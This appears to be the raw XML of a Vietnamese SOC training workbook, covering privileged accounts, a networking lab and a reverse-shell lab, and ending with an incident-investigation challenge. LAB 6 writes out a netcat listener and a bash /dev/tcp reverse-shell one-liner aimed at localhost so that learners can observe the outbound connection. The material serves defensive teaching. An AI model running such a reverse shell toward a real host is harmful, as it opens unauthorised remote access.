      <w:r>
        <w:t>?</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002E5977" w:rsidRDefault="002E5977">
      <w:r>
        <w:t xml:space="preserve">+ </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="002E5977">
        <w:rPr>
          <w:bCs/>
        </w:rPr>
        <w:t>Tài</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="002E5977">
        <w:rPr>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="002E5977">
        <w:rPr>
          <w:bCs/>
        </w:rPr>
        <w:t>khoản</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="002E5977">
        <w:rPr>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="002E5977">
        <w:rPr>
          <w:bCs/>
        </w:rPr>
        <w:t>mụ</w:t>
      </w:r>
      <w:r w:rsidRPr="002E5977">
        <w:rPr>
          <w:bCs/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="002E5977">
        <w:rPr>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="002E5977">
        <w:rPr>
          <w:bCs/>
        </w:rPr>
        <w:t>tiêu</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="002E5977">
        <w:rPr>
          <w:bCs/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r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nhắm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ai</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00711FBD">
        <w:br/>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00711FBD">
        <w:t>Có</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00711FBD">
        <w:t xml:space="preserve"> r</w:t>
      </w:r>
      <w:r w:rsidR="00711FBD">
        <w:t>ủ</w:t>
      </w:r>
      <w:r w:rsidR="00711FBD">
        <w:t xml:space="preserve">i </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00711FBD">
        <w:t>ro</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00711FBD">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00711FBD">
        <w:t>b</w:t>
      </w:r>
      <w:r w:rsidR="00711FBD">
        <w:t>ả</w:t>
      </w:r>
      <w:r w:rsidR="00711FBD">
        <w:t>o</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00711FBD">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00711FBD">
        <w:t>m</w:t>
      </w:r>
      <w:r w:rsidR="00711FBD">
        <w:t>ậ</w:t>
      </w:r>
      <w:r w:rsidR="00711FBD">
        <w:t>t</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00711FBD">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00711FBD">
        <w:t>nào</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00711FBD">
        <w:t>?</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002E5977" w:rsidRDefault="002E5977"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:rsidR="002E5977" w:rsidRDefault="002E5977">
      <w:r>
        <w:t xml:space="preserve">+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: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:rsidR="00C6133F" w:rsidRDefault="002E5977">
      <w:r>
        <w:t xml:space="preserve">+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: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 w:rsidR="00711FBD">
        <w:br/>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00711FBD">
        <w:t>N</w:t>
      </w:r>
      <w:r w:rsidR="00711FBD">
        <w:t>ế</w:t>
      </w:r>
      <w:r w:rsidR="00711FBD">
        <w:t>u</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00711FBD">
        <w:t xml:space="preserve"> là h</w:t>
      </w:r>
      <w:r w:rsidR="00711FBD">
        <w:t>ệ</w:t>
      </w:r>
      <w:r w:rsidR="00711FBD">
        <w:t xml:space="preserve"> th</w:t>
      </w:r>
      <w:r w:rsidR="00711FBD">
        <w:t>ố</w:t>
      </w:r>
      <w:r w:rsidR="00711FBD">
        <w:t>ng th</w:t>
      </w:r>
      <w:r w:rsidR="00711FBD">
        <w:t>ậ</w:t>
      </w:r>
      <w:r w:rsidR="00711FBD">
        <w:t>t thì c</w:t>
      </w:r>
      <w:r w:rsidR="00711FBD">
        <w:t>ầ</w:t>
      </w:r>
      <w:r w:rsidR="00711FBD">
        <w:t xml:space="preserve">n </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00711FBD">
        <w:t>x</w:t>
      </w:r>
      <w:r w:rsidR="00711FBD">
        <w:t>ử</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00711FBD">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00711FBD">
        <w:t>lý</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00711FBD">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00711FBD">
        <w:t>gì</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00711FBD">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00711FBD">
        <w:t>thêm</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00711FBD">
        <w:t>?</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003C1AEE" w:rsidRDefault="003C1AEE">
      <w:r>
        <w:t xml:space="preserve">+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</w:p>
    <w:p w:rsidR="003C1AEE" w:rsidRDefault="003C1AEE">
      <w:pPr>
        <w:rPr>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">+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: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 w:rsidRPr="003C1AEE">
        <w:rPr>
          <w:bCs/>
        </w:rPr>
        <w:t>SSH Keys</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003C1AEE" w:rsidRDefault="003C1AEE">
      <w:r>
        <w:rPr>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">+ </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:bCs/>
        </w:rPr>
        <w:t>Bảo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vệ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tài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khoản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đặc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quyền</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w:rsidR="00C6133F" w:rsidRDefault="00711FBD">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>LAB 5 - Networking</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C6133F" w:rsidRDefault="00711FBD">
      <w:r>
        <w:t>M</w:t>
      </w:r>
      <w:r>
        <w:t>ụ</w:t>
      </w:r>
      <w:r>
        <w:t>c tiêu:</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>Ki</w:t>
      </w:r>
      <w:r>
        <w:t>ể</w:t>
      </w:r>
      <w:r>
        <w:t>m tra IP và port</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C6133F" w:rsidRDefault="00711FBD">
      <w:r>
        <w:t>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n:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C6133F" w:rsidRDefault="00711FBD">
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Bư</w:t>
      </w:r>
      <w:r>
        <w:t>ớ</w:t>
      </w:r>
      <w:r>
        <w:t>c 1: Ki</w:t>
      </w:r>
      <w:r>
        <w:t>ể</w:t>
      </w:r>
      <w:r>
        <w:t>m tra IP</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C6133F" w:rsidRDefault="00711FBD">
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>ip</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> a</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00711FBD" w:rsidRDefault="00711FBD">
      <w:r w:rsidRPr="00711FBD">
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="277EFE90" wp14:editId="657CEFCC">
            <wp:extent cx="5486400" cy="17221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6133F" w:rsidRDefault="00711FBD">
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Bư</w:t>
      </w:r>
      <w:r>
        <w:t>ớ</w:t>
      </w:r>
      <w:r>
        <w:t>c 2: Ping internet</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C6133F" w:rsidRDefault="00711FBD">
      <w:r>
        <w:t>ping google.com</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C6133F" w:rsidRDefault="00711FBD">
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Bư</w:t>
      </w:r>
      <w:r>
        <w:t>ớ</w:t>
      </w:r>
      <w:r>
        <w:t>c 3: Ki</w:t>
      </w:r>
      <w:r>
        <w:t>ể</w:t>
      </w:r>
      <w:r>
        <w:t>m tra port</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C6133F" w:rsidRDefault="00711FBD">
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>ss</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="003C1AEE">
        <w:t>–</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>tulnp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w:rsidR="003C1AEE" w:rsidRDefault="003C1AEE">
      <w:r w:rsidRPr="003C1AEE">
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="4183CAB5" wp14:editId="526E8F0B">
            <wp:extent cx="5486400" cy="15411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33F" w:rsidRDefault="00711FBD">
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Bư</w:t>
      </w:r>
      <w:r>
        <w:t>ớ</w:t>
      </w:r>
      <w:r>
        <w:t>c 4: Tìm port SSH</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C6133F" w:rsidRDefault="00711FBD">
      <w:r>
        <w:t>ss -tulnp | grep 22</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C6133F" w:rsidRDefault="00711FBD">
      <w:r>
        <w:t>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i:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C6133F" w:rsidRDefault="00711FBD">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Th</w:t>
      </w:r>
      <w:r>
        <w:t>ấ</w:t>
      </w:r>
      <w:r>
        <w:t>y IP máy</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C6133F" w:rsidRDefault="00711FBD">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Hi</w:t>
      </w:r>
      <w:r>
        <w:t>ể</w:t>
      </w:r>
      <w:r>
        <w:t>u listening port</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C6133F" w:rsidRDefault="00711FBD">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Bi</w:t>
      </w:r>
      <w:r>
        <w:t>ế</w:t>
      </w:r>
      <w:r>
        <w:t>t SSH port</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C6133F" w:rsidRDefault="00711FBD">
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Phân tích sau LAB:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C6133F" w:rsidRDefault="00711FBD">
      <w:r>
        <w:t>- Command nào quan tr</w:t>
      </w:r>
      <w:r>
        <w:t>ọ</w:t>
      </w:r>
      <w:r>
        <w:t>ng nh</w:t>
      </w:r>
      <w:r>
        <w:t>ấ</w:t>
      </w:r>
      <w:r>
        <w:t>t?</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>- Output nào c</w:t>
      </w:r>
      <w:r>
        <w:t>ầ</w:t>
      </w:r>
      <w:r>
        <w:t>n chú ý?</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>- Có r</w:t>
      </w:r>
      <w:r>
        <w:t>ủ</w:t>
      </w:r>
      <w:r>
        <w:t>i ro b</w:t>
      </w:r>
      <w:r>
        <w:t>ả</w:t>
      </w:r>
      <w:r>
        <w:t>o m</w:t>
      </w:r>
      <w:r>
        <w:t>ậ</w:t>
      </w:r>
      <w:r>
        <w:t>t nào?</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>- N</w:t>
      </w:r>
      <w:r>
        <w:t>ế</w:t>
      </w:r>
      <w:r>
        <w:t>u là h</w:t>
      </w:r>
      <w:r>
        <w:t>ệ</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> th</w:t>
      </w:r>
      <w:r>
        <w:t>ố</w:t>
      </w:r>
      <w:r>
        <w:t>ng th</w:t>
      </w:r>
      <w:r>
        <w:t>ậ</w:t>
      </w:r>
      <w:r>
        <w:t>t thì c</w:t>
      </w:r>
      <w:r>
        <w:t>ầ</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> x</w:t>
      </w:r>
      <w:r>
        <w:t>ử</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> lý gì thêm?</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C6133F" w:rsidRDefault="00711FBD">
      <w:r>
        <w:t>Ả</w:t>
      </w:r>
      <w:r>
        <w:t>nh ch</w:t>
      </w:r>
      <w:r>
        <w:t>ụ</w:t>
      </w:r>
      <w:r>
        <w:t>p th</w:t>
      </w:r>
      <w:r>
        <w:t>ự</w:t>
      </w:r>
      <w:r>
        <w:t>c hành:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C6133F" w:rsidRDefault="00711FBD">
      <w:r>
        <w:br/>
        <w:t>------------------------------------------------------------</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>------------------------------------------------------------</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C6133F" w:rsidRDefault="00711FBD">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>LAB 6 - Reverse Shell</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C6133F" w:rsidRDefault="00711FBD">
      <w:r>
        <w:t>M</w:t>
      </w:r>
      <w:r>
        <w:t>ụ</w:t>
      </w:r>
      <w:r>
        <w:t>c tiêu:</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>Hi</w:t>
      </w:r>
      <w:r>
        <w:t>ể</w:t>
      </w:r>
      <w:r>
        <w:t>u outbound connection</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C6133F" w:rsidRDefault="00711FBD">
      <w:r>
        <w:t>Các bư</w:t>
      </w:r>
      <w:r>
        <w:t>ớ</w:t>
      </w:r>
      <w:r>
        <w:t>c th</w:t>
      </w:r>
      <w:r>
        <w:t>ự</w:t>
      </w:r>
      <w:r>
        <w:t>c hi</w:t>
      </w:r>
      <w:r>
        <w:t>ệ</w:t>
      </w:r>
      <w:r>
        <w:t>n:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C6133F" w:rsidRDefault="00711FBD">
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Bư</w:t>
      </w:r>
      <w:r>
        <w:t>ớ</w:t>
      </w:r>
      <w:r>
        <w:t>c 1: M</w:t>
      </w:r>
      <w:r>
        <w:t>ở</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> listener</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C6133F" w:rsidRDefault="00711FBD">
      <w:r>
        <w:t>nc -lvnp 4444</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C6133F" w:rsidRDefault="00711FBD">
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Bư</w:t>
      </w:r>
      <w:r>
        <w:t>ớ</w:t>
      </w:r>
      <w:r>
        <w:t>c 2: M</w:t>
      </w:r>
      <w:r>
        <w:t>ở</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> terminal m</w:t>
      </w:r>
      <w:r>
        <w:t>ớ</w:t>
      </w:r>
      <w:r>
        <w:t>i</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C6133F" w:rsidRDefault="00711FBD">
      <w:r>
        <w:t>Ctrl + Shift + T</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C6133F" w:rsidRDefault="00711FBD">
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Bư</w:t>
      </w:r>
      <w:r>
        <w:t>ớ</w:t>
      </w:r>
      <w:r>
        <w:t>c 3: T</w:t>
      </w:r>
      <w:r>
        <w:t>ạ</w:t>
      </w:r>
      <w:r>
        <w:t>o reverse shell</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C6133F" w:rsidRDefault="00711FBD">
      <w:r>
        <w:t>bash -i &gt;&amp; /dev/tcp/127.0.0.1/4444 0&gt;&amp;1</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C6133F" w:rsidRDefault="00711FBD">
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Bư</w:t>
      </w:r>
      <w:r>
        <w:t>ớ</w:t>
      </w:r>
      <w:r>
        <w:t>c 4: Ki</w:t>
      </w:r>
      <w:r>
        <w:t>ể</w:t>
      </w:r>
      <w:r>
        <w:t>m tra connection</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C6133F" w:rsidRDefault="00711FBD">
      <w:r>
        <w:t>ss -antp</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C6133F" w:rsidRDefault="00711FBD">
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Bư</w:t>
      </w:r>
      <w:r>
        <w:t>ớ</w:t>
      </w:r>
      <w:r>
        <w:t>c 5: Kill process</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C6133F" w:rsidRDefault="00711FBD">
      <w:r>
        <w:t>kill -9 PID</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C6133F" w:rsidRDefault="00711FBD">
      <w:r>
        <w:t>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i:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C6133F" w:rsidRDefault="00711FBD">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Th</w:t>
      </w:r>
      <w:r>
        <w:t>ấ</w:t>
      </w:r>
      <w:r>
        <w:t>y outbound connection</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C6133F" w:rsidRDefault="00711FBD">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Hi</w:t>
      </w:r>
      <w:r>
        <w:t>ể</w:t>
      </w:r>
      <w:r>
        <w:t>u reverse shell</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C6133F" w:rsidRDefault="00711FBD">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Hi</w:t>
      </w:r>
      <w:r>
        <w:t>ể</w:t>
      </w:r>
      <w:r>
        <w:t>u suspicious connection</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C6133F" w:rsidRDefault="00711FBD">
      <w:r>
        <w:t>Phân tích sau LAB:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C6133F" w:rsidRDefault="00711FBD">
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>- Command nào quan tr</w:t>
      </w:r>
      <w:r>
        <w:t>ọ</w:t>
      </w:r>
      <w:r>
        <w:t>ng nh</w:t>
      </w:r>
      <w:r>
        <w:t>ấ</w:t>
      </w:r>
      <w:r>
        <w:t>t?</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>- Output nào c</w:t>
      </w:r>
      <w:r>
        <w:t>ầ</w:t>
      </w:r>
      <w:r>
        <w:t>n chú ý?</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>- Có r</w:t>
      </w:r>
      <w:r>
        <w:t>ủ</w:t>
      </w:r>
      <w:r>
        <w:t>i ro b</w:t>
      </w:r>
      <w:r>
        <w:t>ả</w:t>
      </w:r>
      <w:r>
        <w:t>o m</w:t>
      </w:r>
      <w:r>
        <w:t>ậ</w:t>
      </w:r>
      <w:r>
        <w:t>t nào?</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>- N</w:t>
      </w:r>
      <w:r>
        <w:t>ế</w:t>
      </w:r>
      <w:r>
        <w:t>u là h</w:t>
      </w:r>
      <w:r>
        <w:t>ệ</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> th</w:t>
      </w:r>
      <w:r>
        <w:t>ố</w:t>
      </w:r>
      <w:r>
        <w:t>ng th</w:t>
      </w:r>
      <w:r>
        <w:t>ậ</w:t>
      </w:r>
      <w:r>
        <w:t>t thì c</w:t>
      </w:r>
      <w:r>
        <w:t>ầ</w:t>
      </w:r>
      <w:r>
        <w:t>n x</w:t>
      </w:r>
      <w:r>
        <w:t>ử</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> lý gì thêm?</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C6133F" w:rsidRDefault="00711FBD">
      <w:r>
        <w:t>Ả</w:t>
      </w:r>
      <w:r>
        <w:t>nh ch</w:t>
      </w:r>
      <w:r>
        <w:t>ụ</w:t>
      </w:r>
      <w:r>
        <w:t>p th</w:t>
      </w:r>
      <w:r>
        <w:t>ự</w:t>
      </w:r>
      <w:r>
        <w:t>c hành:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C6133F" w:rsidRDefault="00711FBD">
      <w:r>
        <w:br/>
        <w:t>------------------------------------------------------------</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>---</w:t>
      </w:r>
      <w:r>
        <w:t>---------------------------------------------------------</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C6133F" w:rsidRDefault="00711FBD">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Challenge T</w:t>
      </w:r>
      <w:r>
        <w:t>ổ</w:t>
      </w:r>
      <w:r>
        <w:t>ng H</w:t>
      </w:r>
      <w:r>
        <w:t>ợ</w:t>
      </w:r>
      <w:r>
        <w:t>p</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C6133F" w:rsidRDefault="00711FBD">
      <w:r>
        <w:t>D</w:t>
      </w:r>
      <w:r>
        <w:t>ự</w:t>
      </w:r>
      <w:r>
        <w:t>ng m</w:t>
      </w:r>
      <w:r>
        <w:t>ộ</w:t>
      </w:r>
      <w:r>
        <w:t>t incident g</w:t>
      </w:r>
      <w:r>
        <w:t>ồ</w:t>
      </w:r>
      <w:r>
        <w:t>m:</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>- CPU cao</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>- Login fail</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>- Reverse shell</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>- Permission sai</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>Sau đó t</w:t>
      </w:r>
      <w:r>
        <w:t>ự</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> đi</w:t>
      </w:r>
      <w:r>
        <w:t>ề</w:t>
      </w:r>
      <w:r>
        <w:t>u tra toàn b</w:t>
      </w:r>
      <w:r>
        <w:t>ộ</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> như SOC Analyst.</w:t>
      </w:r>
    </w:p>
    <w:sectPr w:rsidR="00C613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91C34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6D082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2C86"/>
    <w:rsid w:val="0015074B"/>
    <w:rsid w:val="0029639D"/>
    <w:rsid w:val="002E5977"/>
    <w:rsid w:val="00326F90"/>
    <w:rsid w:val="003C1AEE"/>
    <w:rsid w:val="006128E9"/>
    <w:rsid w:val="006825B4"/>
    <w:rsid w:val="00711FBD"/>
    <w:rsid w:val="00984D42"/>
    <w:rsid w:val="00A31589"/>
    <w:rsid w:val="00AA1D8D"/>
    <w:rsid w:val="00B47730"/>
    <w:rsid w:val="00BE564F"/>
    <w:rsid w:val="00C6133F"/>
    <w:rsid w:val="00CB0664"/>
    <w:rsid w:val="00FC50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D79E68"/>
  <w14:defaultImageDpi w14:val="300"/>
  <w15:docId w15:val="{90707207-C05C-48B2-8BE9-EA497EF9C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F2B97E-76D6-44E1-9062-F580658FC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10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vds-tts-phucdv</cp:lastModifiedBy>
  <cp:revision>2</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2013-12-23T23:15:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-05-13T08:50:00Z</dcterms:modified>
  <cp:category/>
</cp:coreProperties>
</file>